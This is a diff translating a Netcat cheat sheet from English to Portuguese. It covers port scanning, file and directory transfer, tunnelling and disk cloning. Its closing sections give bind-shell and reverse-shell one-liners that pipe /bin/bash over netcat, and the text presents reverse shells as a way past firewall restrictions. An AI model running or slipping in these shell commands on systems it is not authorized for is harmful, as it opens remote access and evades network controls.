@@ -9,59 +9,59 @@ tags:
   - network
   - traffic
 categories:
-  - Linux Command
-intro: This cheat sheet provides various for using Netcat on both Linux and Unix.
+  - Comandos Linux
+intro: Este cheat sheet traz várias formas de usar o Netcat no Linux e no Unix.
 plugins:
   - copyCode
 ---
 
-## Getting Started {.cols-5}
+## Primeiros passos {.cols-5}
 
-### Usage {.col-span-2}
+### Uso {.col-span-2}
 
-Connect to a host located anywhere
+Conecte-se a um host em qualquer lugar
 
 ```shell script
 $ nc [options] [host] [port]
 ```
 
-Listen for incoming connections
+Escute por conexões de entrada
 
 ```shell script
 $ nc -lp port [host] [port]
 ```
 
-### Option examples {.col-span-3 .row-span-2}
+### Exemplos de opções {.col-span-3 .row-span-2}
 
-| Option | Description                | Example                                  |
+| Opção | Descrição                  | Exemplo                                  |
 | ------ | -------------------------- | ---------------------------------------- |
-| `-h`   | nc -h                      | Help                                     |
-| `-z`   | nc -z 192.168.1.9 1-100    | Port scan for a host or IP address       |
-| `-v`   | nc -zv 192.168.1.9 1-100   | Provide verbose output                   |
-| `-n`   | nc -zn 192.168.1.9 1-100   | Fast scan by disabling DNS resolution    |
-| `-l`   | nc -lp 8000                | TCP Listen mode _(for inbound connects)_ |
-| `-w`   | nc -w 180 192.168.1.9 8000 | Define timeout value                     |
-| `-k`   | nc -kl 8000                | Continue listening after disconnection   |
-| `-u`   | nc -u 192.168.1.9 8000     | Use UDP instead of TCP                   |
-| `-q`   | nc -q 1 192.168.1.9 8000   | Client stay up after EOF                 |
-| `-4`   | nc -4 -l 8000              | IPv4 only                                |
-| `-6`   | nc -6 -l 8000              | IPv6 only                                |
+| `-h`   | nc -h                      | Ajuda                                    |
+| `-z`   | nc -z 192.168.1.9 1-100    | Scan de portas de um host ou endereço IP |
+| `-v`   | nc -zv 192.168.1.9 1-100   | Fornece saída verbosa                    |
+| `-n`   | nc -zn 192.168.1.9 1-100   | Scan rápido desativando a resolução DNS  |
+| `-l`   | nc -lp 8000                | Modo TCP Listen _(para conexões de entrada)_ |
+| `-w`   | nc -w 180 192.168.1.9 8000 | Define o valor de timeout                |
+| `-k`   | nc -kl 8000                | Continua escutando após a desconexão     |
+| `-u`   | nc -u 192.168.1.9 8000     | Usa UDP em vez de TCP                    |
+| `-q`   | nc -q 1 192.168.1.9 8000   | Cliente permanece ativo após o EOF       |
+| `-4`   | nc -4 -l 8000              | Apenas IPv4                              |
+| `-6`   | nc -6 -l 8000              | Apenas IPv6                              |
 
-### Chat client-server {.col-span-2}
+### Chat cliente-servidor {.col-span-2}
 
-Server (192.168.1.9)
+Servidor (192.168.1.9)
 
 ```shell script
 $ nc -lv 8000
 ```
 
-Client
+Cliente
 
 ```shell script
 $ nc 192.168.1.9 8000
 ```
 
-## Netcat Examples
+## Exemplos do Netcat
 
 ### Banner grabbing
 
@@ -71,165 +71,165 @@ GET index.html HTTP/1.1
 HEAD / HTTP/1.1
 ```
 
-or
+ou
 
 ```shell script
 echo "" | nc -zv -wl 192.168.1.1 801-805
 ```
 
-### Port scanning
+### Scan de portas
 
-Scan ports between 21 to 25
+Escaneia as portas entre 21 e 25
 
 ```shell script
 $ nc -zvn 192.168.1.1 21-25
 ```
 
-Scan ports 22, 3306 and 8080
+Escaneia as portas 22, 3306 e 8080
 
 ```shell script
 $ nc -zvn 192.168.1.1 22 3306 8080
 ```
 
-### Proxy and port forwarding
+### Proxy e port forwarding
 
 ```shell script
 $ nc -lp 8001 -c "nc 127.0.0.1 8000"
 ```
 
-or
+ou
 
 ```shell script
 $ nc -l 8001 | nc 127.0.0.1 8000
 ```
 
-Create a tunnel from one local port to another
+Cria um túnel de uma porta local para outra
 
-### Download file
+### Download de arquivo
 
-Server (192.168.1.9)
+Servidor (192.168.1.9)
 
 ```shell script
 $ nc -lv 8000 < file.txt
 ```
 
-Client
+Cliente
 
 ```shell script
 $ nc -nv 192.168.1.9 8000 > file.txt
 ```
 
-Suppose you want to transfer a file “file.txt” from server A to client B.
+Suponha que você queira transferir um arquivo “file.txt” do servidor A para o cliente B.
 
-### Upload file
+### Upload de arquivo
 
-Server (192.168.1.9)
+Servidor (192.168.1.9)
 
 ```shell script
 $ nc -lv 8000 > file.txt
 ```
 
-Client
+Cliente
 
 ```shell script
 $ nc 192.168.1.9 8000 < file.txt
 ```
 
-Suppose you want to transfer a file “file.txt” from client B to server A:
+Suponha que você queira transferir um arquivo “file.txt” do cliente B para o servidor A:
 
-### Directory transfer
+### Transferência de diretório
 
-Server (192.168.1.9)
+Servidor (192.168.1.9)
 
 ```shell script
 $ tar -cvf – dir_name | nc -l 8000
 ```
 
-Client
+Cliente
 
 ```shell script
 $ nc -n 192.168.1.9 8000 | tar -xvf -
 ```
 
-Suppose you want to transfer a directory over the network from A to B.
+Suponha que você queira transferir um diretório pela rede de A para B.
 
-### Encrypt transfer {.col-span-2}
+### Transferência criptografada {.col-span-2}
 
-Server (192.168.1.9)
+Servidor (192.168.1.9)
 
 ```shell script
 $ openssl enc -des3 -in file.txt -pass pass:password | nc -l 8000
 ```
 
-Client
+Cliente
 
 ```shell script
 $ nc 192.168.1.9 8000 | openssl enc -des3 -d -pass pass:password -out file.txt
 ```
 
-Encrypt data before transfering over the network
+Criptografe os dados antes de transferir pela rede
 
-### Clones
+### Clonagem
 
-Server (192.168.1.9)
+Servidor (192.168.1.9)
 
 ```shell script
 $ dd if=/dev/sda | nc -l 8000
 ```
 
-Client
+Cliente
 
 ```shell script
 $ nc -n 192.168.1.9 8000 | dd of=/dev/sda
 ```
 
-Cloning a linux PC is very simple. Suppose your system disk is /dev/sda
+Clonar um PC Linux é muito simples. Suponha que o disco do seu sistema seja /dev/sda
 
-### Video streaming
+### Streaming de vídeo
 
-Server (192.168.1.9)
+Servidor (192.168.1.9)
 
 ```shell script
 $ cat video.avi | nc -l 8000
 ```
 
-Client
+Cliente
 
 ```shell script {.wrap}
 $ nc 192.168.1.9 8000 | mplayer -vo x11 -cache 3000 -
 ```
 
-Streaming video with netcat
+Faz streaming de vídeo com o netcat
 
-### Remote shell
+### Shell remoto
 
-Server (192.168.1.9)
+Servidor (192.168.1.9)
 
 ```shell script
 $ nc -lv 8000 -e /bin/bash
 ```
 
-Client
+Cliente
 
 ```shell script
 $ nc 192.168.1.9 8000
 ```
 
-We have used remote Shell using the telnet and ssh but what if they are not installed and we do not have the permission
-to install them, then we can create remote shell using netcat also.
+Já usamos shell remoto com telnet e ssh, mas e se eles não estiverem instalados e não tivermos permissão
+para instalá-los? Nesse caso, também podemos criar um shell remoto usando o netcat.
 
 ### Reverse shell
 
-Server (192.168.1.9)
+Servidor (192.168.1.9)
 
 ```shell script
 $ nc -lv 8000
 ```
 
-Client
+Cliente
 
 ```shell script
 $ nc 192.168.1.9 8000 -v -e /bin/bash
 ```
 
-Reverse shells are often used to bypass the firewall restrictions like blocked inbound connections
+Reverse shells costumam ser usados para contornar restrições de firewall, como conexões de entrada bloqueadas
